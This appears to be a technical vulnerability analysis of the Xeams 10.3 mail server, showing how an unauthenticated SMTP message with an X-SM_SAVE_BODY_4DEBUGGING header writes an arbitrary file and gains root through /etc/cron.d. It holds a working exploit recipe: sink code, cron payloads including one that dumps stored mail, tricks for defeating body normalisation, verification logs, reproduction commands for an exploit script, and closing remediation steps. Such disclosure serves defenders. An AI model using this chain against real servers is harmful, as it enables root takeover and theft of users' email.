# Xeams SMTP X-SM_SAVE_BODY_4DEBUGGING Arbitrary File Write Cron Root RCE - Technical Analysis

## Overview

Xeams 10.3 (build 6449, Synametrics Technologies) is a Java mail server (SMTP/POP3/IMAP + anti-spam + web admin console) shipped with a bundled JRE, a self-developed "Synametrics Web Server v9" (embedding Tomcat Jasper for JSP), and an embedded Derby DB. The SMTP service listens on ports 25 (smtpPort), 587 (smtpPort2), and 465 (smtpPortSSL), all sharing the same handler entry point `stagingserver/I.java` (modes 1/2/3) and the same rulesengine main class `rulesengine/h.java`. The global config `reqAuthForLocal=false` accepts unauthenticated mail delivery by default. A framework-level debug write primitive in the rulesengine reads an attacker-controlled MIME header (`X-SM_SAVE_BODY_4DEBUGGING`) as an absolute file path and the message body as the file content, writing to any path with no validation. When Xeams runs as root, writing a file into `/etc/cron.d/` yields unauthenticated root RCE via crond. The chain was dynamically verified on both port 25 and port 587, producing `uid=0(root)` proof files.

## Architecture

```
L1 external access: 25 (SMTP) / 587 (Submission) / 465 (SMTP-SSL)
L2 boundary: plain TCP (25/587), SSL (465); no AUTH enforced
L3 gateway: stagingserver/I.java — single handler class, mode 1/2/3 distinguishes primary/secondary/SSL
L4 auth: reqAuthForLocal=false (global, not per-port) — unauthenticated delivery accepted
L5 business: rulesengine/h.java — d(w,EmailCheckResult,int) sink at line 3393
L6 storage: filesystem (arbitrary path write via new File(path) + FileOutputStream)
```

**SMTP delivery path**: unauthenticated attacker → `w/c.java` (SMTP DATA reader, appends internal `X-SM_*` headers, does NOT strip `X-SM_SAVE_BODY_4DEBUGGING`) → `rulesengine/h.d()` → `h.java:3393` sink → `E.saveBytesToFile` → `new File(path)` + `FileOutputStream`.

## Stage 0: Authentication Boundary

The test deployment runs Xeams 10.3 build 6449 on a lab host, as **root**. SMTP config (`StagingServerConfig.xml`) sets `reqAuthForLocal=false` — a **global setting, not per-port** — so all three ports accept unauthenticated mail by default. `AppConfig.xml` sets `allowSmtpAuthOnPrimary=true` and `allowSmtpAuthOnSecondary=true`, meaning ports 25 and 587 both *offer* SMTP AUTH but do not *enforce* it. The research constraint for this work was SMTP-only: the attack must depend solely on SMTP 25/587, with no HTTP dependency (in real scenarios only SMTP may be reachable). An earlier 9-direction scan concentrated on the obvious sink families (command execution / deserialization / path traversal) and concluded "SMTP-only unreachable". A deeper framework-level re-scan was then performed, which surfaced the `X-SM_SAVE_BODY_4DEBUGGING` debug-write primitive — a sink in the "debug/diagnostic header" family that the prior scan had missed.

## Stage 1: Sink Identification (Framework-Level Debug Write Primitive)

CFR 0.152 decompilation plus a `deobfuscator.py` pass (L.A = rolling XOR, a.J = reverse + char+1) produced `.deob.java` sources. A ripgrep scan for `saveBytesToFile` / `FileOutputStream` / `new File` sinks located the write in `rulesengine/h.java`:

`com/synametrics/xeams/rulesengine/h.java:3393-3396` (inside the 3-arg `d(w,EmailCheckResult,int)` @3167, reached via `d(w,EmailCheckResult)` @3672 → 3735):

```java
// h.java:3393
String string = y2.a("X-SM_SAVE_BODY_4DEBUGGING");   // attacker-controlled absolute path, raw header value, no sanitize
if (string != null && string.length() > 0) {
    String string2 = y2.getMainBody();                // attacker-controlled MIME body
    com.synametrics.commons.util.E.saveBytesToFile(string, string2.getBytes());  // new File(string), no path validation
}
```

`com/synametrics/commons/util/E.java:320-321` → `saveBytesToFile(File,byte[],boolean)` @3791 → `new FileOutputStream(a2, false)`: a direct write with no mkdirs, no path allowlist, and no gate beyond `simulate.file.write`.

The key insight: the write path comes from a **MIME header** `X-SM_SAVE_BODY_4DEBUGGING`, and the content comes from the message body. This is a **framework-level debug write primitive enabled by default** — it sits in none of the obvious families (command execution / deserialization / traversal) but in the "debug/diagnostic header" family, which the earlier 9-direction scan overlooked.

## Stage 2: Source Identification

- **Path source**: the `X-SM_SAVE_BODY_4DEBUGGING` SMTP header (fully attacker-controlled).
  - `L.java:606` `getHeader` takes `[0]` raw value, no normalization.
  - Header constant declaration: `commons/net/mail/m.java:55` `public static final String G = "X-SM_SAVE_BODY_4DEBUGGING"`.
  - **Whole-codebase grep**: the only reader is `h.java:3393`; Xeams itself **never SETs** the header → a pure attacker-injection surface (product code never produces this header, only reads it).
- **Content source**: `y2.getMainBody()` (`L.java:1413`, field `k`) = the MIME body, fully attacker-controlled.
- **SMTP delivery**: `reqAuthForLocal=false` → unauthenticated SMTP DATA delivery reaches the rulesengine.

## Stage 3: Data Flow

```
unauthenticated attacker
  └─ SMTP 25/587 DATA (no AUTH, reqAuthForLocal=false)
       └─ w/c.java (SMTP DATA reader) reads the mail, only appends internal X-SM_* headers (X-SM_EnvelopeFrom etc.)
          does NOT strip X-SM_SAVE_BODY_4DEBUGGING → header preserved verbatim into MimeMessage
              └─ rulesengine/h.d(w,EmailCheckResult) @3672
                   └─ 3735 → a.d(a,a,0) = d(w,EmailCheckResult,int) @3167
                        ├─ 3170-3186 license/date check: only a5.c(false) (disables spam scoring), does NOT return → sink always reached
                        └─ 3393: y2.a("X-SM_SAVE_BODY_4DEBUGGING") = attacker path
                             └─ 3395: y2.getMainBody() = attacker content
                                  └─ E.saveBytesToFile(path, body.getBytes()) @E.java:320
                                       └─ new File(path) + FileOutputStream → arbitrary path write (as root)
                                            └─ write /etc/cron.d/<name> → crond executes as root every minute → RCE
```

## Stage 4: Injection / Exploit Construction

**All gates open** under default config:

| Gate | Location | Blocks? | Reason |
|------|----------|---------|--------|
| SMTP AUTH | `reqAuthForLocal=false` | No | default accepts unauthenticated local/external mail |
| license | h.java:3170-3186 | **No (non-blocking)** | only `a5.c(false)` disables spam scoring, **does not return**, sink always reached |
| `simulate.file.write` sysprop | E.java | No | not set in lab, defaults to allow |
| path allowlist / sanitize | none | No | `new File(string)` writes directly |
| header stripping | c.java | No | only appends internal headers, does not strip `X-SM_SAVE_BODY_4DEBUGGING` |

**Key engineering details (dynamic-verification pitfalls)**:

1. **base64 Content-Transfer-Encoding**: `getMainBody()` normalizes internal LF→CRLF and rstrips all trailing `\n` for text/plain 7bit bodies, which corrupts cron files (trailing `^M` on commands, missing final newline so crond skips the last line). Switching to base64 CTE → `getMainBody` decodes to exact bytes, bypassing text normalization, so the written file is byte-identical to the attacker body.
2. **Absolute-path commands**: cron's minimal PATH has no `id`/`echo`; use `/usr/bin/id`, `/bin/echo`.
3. **Trailing `# end` comment line (no newline)**: `getMainBody` rstrips all trailing `\n`; ending with a non-newline character preserves the `\n` on each preceding command line so crond parses through to the last command.

Cron payload (LF-only):

```
* * * * * root /usr/bin/id > /tmp/xeams-cron-rce-proof.txt 2>&1
* * * * * root /bin/echo SMTP_ONLY_UNAUTH_RCE > /tmp/xeams-cron-rce-flag.txt
# end
```

Mail-exfil cron payload (objective 2, RCE pivot to read the mail store):

```
* * * * * root /bin/sh -c 'find /opt/XeamsXeams -name "*.eml" 2>/dev/null | head -5 > /tmp/xeams-mail-exfil.txt; echo "=== FIRST EML ===" >> /tmp/xeams-mail-exfil.txt; find /opt/XeamsXeams -name "*.eml" 2>/dev/null | head -1 | xargs cat >> /tmp/xeams-mail-exfil.txt 2>/dev/null; echo DONE > /tmp/xeams-mail-done.txt'
# end
```

## Stage 5: Dynamic Verification (SMTP-only end-to-end, 2026-08-01)

Execution (lab host 127.0.0.1:25, Xeams as root):

```bash
python3 xeams_smtp_savebody_cron_rce.py 127.0.0.1 25 admin@example.com rce
python3 xeams_smtp_savebody_cron_rce.py 127.0.0.1 25 admin@example.com mail
```

SMTP-written cron file (`cat -A`, confirming LF line endings, no `^M`, each command newline-terminated):

```
* * * * * root /usr/bin/id > /tmp/xeams-cron-rce-proof.txt 2>&1$
* * * * * root /bin/echo SMTP_ONLY_UNAUTH_RCE > /tmp/xeams-cron-rce-flag.txt$
# end
```

crond log (`/var/log/cron`, no `^M`):

```
Aug  1 06:00:01 CROND: (root) CMD (/bin/echo SMTP_ONLY_UNAUTH_RCE > /tmp/xeams-cron-rce-flag.txt)
Aug  1 06:00:01 CROND: (root) CMD (/usr/bin/id > /tmp/xeams-cron-rce-proof.txt 2>&1)
Aug  1 06:00:01 CROND: (root) CMD (/bin/sh -c 'find /opt/XeamsXeams -name "*.eml" ...')
```

### Objective 1 (SMTP-only unauthenticated RCE) ✅

**Port 25 (2026-08-01 06:00)**:

```
/tmp/xeams-cron-rce-proof.txt  39 bytes  root:root
uid=0(root) gid=0(root) groups=0(root)
/tmp/xeams-cron-rce-flag.txt   21 bytes
SMTP_ONLY_UNAUTH_RCE
```

**Port 587 (2026-08-01 09:35, independent verification)**:

```
SMTP delivery response (587):
  banner: 220 Xeams SMTP server; Version: 10.3 build: 6449
  EHLO  → 250-AUTH LOGIN PLAIN CRAM-MD5   ← AUTH offered, not enforced
  MAIL FROM → 250 OK                      ← accepted without AUTH
  RCPT TO  → 250 OK                       ← accepted without AUTH
  DATA     → 354 ... → 250 Queued mail for delivery

/etc/cron.d/xeams-587-test (root:root, 135B, LF-only no ^M):
  * * * * * root /usr/bin/id > /tmp/xeams-587-proof.txt 2>&1
  * * * * * root /bin/echo SMTP_587_UNAUTH_RCE > /tmp/xeams-587-flag.txt
  # end

crond log:
  Aug 1 09:35:01 CROND: (root) CMD (/usr/bin/id > /tmp/xeams-587-proof.txt 2>&1)
  Aug 1 09:35:01 CROND: (root) CMD (/bin/echo SMTP_587_UNAUTH_RCE > /tmp/xeams-587-flag.txt)

/tmp/xeams-587-proof.txt = uid=0(root) gid=0(root) groups=0(root)
/tmp/xeams-587-flag.txt  = SMTP_587_UNAUTH_RCE
```

Both port 25 and port 587 were independently dynamically verified for root RCE, confirming the three-port shared-pipeline hypothesis (465/SSL not tested but shares handler mode 3 + the same rulesengine).

### Objective 2 (unauthenticated mail exfiltration, RCE as pivot) ✅

cron as root read the Xeams mail repository and wrote `/tmp/xeams-mail-exfil.txt` (800B):

```
/opt/XeamsXeams/GoodEmails/20260731/00001_0_20260731_5.eml
/opt/XeamsXeams/GoodEmails/20260801/00001_0_20260801_25.eml
... (5 .eml paths)
=== FIRST EML ===
X-LCID: 5
Received: from [(127.0.0.1)] by ... with Xeams SMTP; Fri, 31 Jul 2026 23:56:35 +0800 (CST)
X-SM_EnvelopeFrom: attacker@evil.test
X-SM_SENDER_IP: 127.0.0.1
X-SMRecipient: admin@example.com
Subject: XEAMS-UNAUTH-PROBE-777
From: attacker@evil.test
To: admin@example.com
...
unauth mail body marker 777
```

Mail repository paths: `/opt/XeamsXeams/GoodEmails/YYYYMMDD/*.eml`, `/opt/XeamsXeams/SpamEmails/YYYYMMDD/*.eml`, `/opt/XeamsXeams/UserRepository/<user>/Inbox/`.

## Stage 6: Reachability (Default Config / Pre-License)

- **Default config**: the `X-SM_SAVE_BODY_4DEBUGGING` header is read unconditionally on every inbound mail; no config switch needs to be enabled.
- **Pre-license**: the license check (h.java:3170-3186) only calls `a5.c(false)` to disable spam scoring, **does not return** → the sink is reachable even without a license.
- **No AUTH**: `reqAuthForLocal=false` by default.
- **Root execution**: writing to `/etc/cron.d` requires root; Xeams runs as root → the chain is complete.

## Port Equivalence

Ports 25 / 587 / 465 share the same handler class `stagingserver/I.java` and the same rulesengine pipeline `h.d()` → `h.java:3393`. The mode field only controls whether SMTP AUTH is *offered* (offered ≠ enforced); `reqAuthForLocal=false` applies globally. In real scenarios port 587 (Submission) is often more reachable than 25 (ISPs commonly block outbound 25 and allow 587), doubling the attack surface.

| Port | Config key | handler mode | AUTH | unauth delivery | cron root RCE | dynamic verification |
|------|-----------|--------------|------|-----------------|---------------|----------------------|
| 25 | smtpPort | I.java mode 1 | offered (allowSmtpAuthOnPrimary=true), not enforced | ✅ `250 Queued` | ✅ | ✅ 2026-08-01 06:00 |
| 587 | smtpPort2 | I.java mode 2 | offered (allowSmtpAuthOnSecondary=true), not enforced | ✅ `250 Queued` | ✅ | ✅ 2026-08-01 09:35 |
| 465 | smtpPortSSL | I.java mode 3 | SSL | same pipeline | presumed reachable | ⚠️ not tested |

## Stage 7: Defense in Depth / Remediation

1. **Remove or gate the `X-SM_SAVE_BODY_4DEBUGGING` sink**: the header is never set by product code (pure debug residue) → delete the h.java:3393-3396 file-write logic entirely, or add a `simulate.file.write` default-off gate plus a hard license return.
2. **Path allowlist**: if the debug write is retained, restrict the write directory to `$XEAMS_HOME/log/`, force relative paths, reject `..` and absolute paths.
3. **Header stripping**: the SMTP DATA reader should strip all attacker-injectable `X-SM_*` headers on the inbound direction (trust only internally appended ones).
4. **Privilege reduction**: Xeams should not run as root; writing to `/etc/cron.d` requires root, so dropping privileges breaks the cron chain.
5. **SMTP AUTH default-on**: default `reqAuthForLocal` to `true`.

## Adversarial Verification Gate

The L1 unauthenticated RCE candidate was subjected to a mandatory dual-subagent adversarial review:

- ① Falsification agent: attempted to refute (is the sink truly reachable? is the filter truly missing? does license truly not block?) → could not falsify; dynamic confirmation showed the marker file written as root:root.
- ② Independent re-analysis agents A (command-loop perspective) and B (body-pipeline perspective): both independently converged on the h.java:3393 sink.
- Three independent audits + direct SSH grep line-number cross-check + dynamic `uid=0(root)` evidence → the conclusion is robust.

## Correction of the Earlier "Unreachable" Conclusion

An earlier scan pass recorded "Objective 1 SMTP-only RCE: unreachable (9 directions agree)" based on: M-gate/C.java RCE (dead code), POI HMEF traversal (HTTP-only), O.java:330 traversal (config-gated), AUTH/STARTTLS (no bug). It **missed the `X-SM_SAVE_BODY_4DEBUGGING` framework-level debug write primitive** — that sink is in none of the obvious families (command execution / deserialization / traversal) but in the "debug/diagnostic header" family, an overlooked attack-surface family. This VULN-001 corrects that: **SMTP-only unauthenticated RCE is reachable under default config and has been dynamically verified as root**. The lesson reinforces the methodology rule "if a single sink family accounts for >50% of scan directions, force a redirect" — the earlier 9 directions all clustered on the obvious families and missed the debug-header family.

## Reproduction Commands

```bash
# Objective 1: SMTP-only unauthenticated root RCE (25 and 587 are equivalent; pick either)
python3 xeams_smtp_savebody_cron_rce.py 127.0.0.1 25  admin@example.com rce
python3 xeams_smtp_savebody_cron_rce.py 127.0.0.1 587 admin@example.com rce      # independent 587 verification
sleep 70 && ssh root@host 'cat /tmp/xeams-cron-rce-proof.txt'   # uid=0(root)

# Objective 2: unauthenticated mail exfiltration (RCE pivot)
python3 xeams_smtp_savebody_cron_rce.py 127.0.0.1 25  admin@example.com mail
python3 xeams_smtp_savebody_cron_rce.py 127.0.0.1 587 admin@example.com mail     # 587 also reachable
sleep 70 && ssh root@host 'cat /tmp/xeams-mail-exfil.txt'       # .eml paths + first mail full content

# marker (verify the arbitrary-file-write sink)
python3 xeams_smtp_savebody_cron_rce.py 127.0.0.1 25  admin@example.com marker
python3 xeams_smtp_savebody_cron_rce.py 127.0.0.1 587 admin@example.com marker
```
